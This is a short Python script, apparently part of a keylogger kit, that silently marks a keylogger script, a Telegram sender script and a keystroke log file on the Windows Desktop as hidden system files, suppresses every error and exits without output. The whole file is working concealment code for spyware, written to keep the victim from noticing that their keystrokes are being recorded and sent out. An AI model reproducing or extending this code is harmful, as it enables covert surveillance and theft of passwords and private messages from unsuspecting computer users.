# HideFiles.pyw - Silent File Hider (NO self-copy to Desktop)
import os
import subprocess
from pathlib import Path

# --- Desktop path ---
desktop = Path(os.path.expanduser("~")) / "Desktop"

# Files to hide on Desktop
files_to_hide = [
    desktop / "Personal_KeyLogger.pyw",
    desktop / "Telegram_Sender.pyw",
    desktop / "textlog.txt"
]

def hide_file(file_path):
    if file_path.exists():
        try:
            # Set Hidden (+H) and System (+S) attributes
            subprocess.call(['attrib', '+H', '+S', str(file_path)],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL)
        except:
            pass

# --- Main (completely silent) ---
try:
    for file_path in files_to_hide:
        hide_file(file_path)

except:
    pass  # Always silent, even on error

# Exit immediately without leaving any trace
os._exit(0)
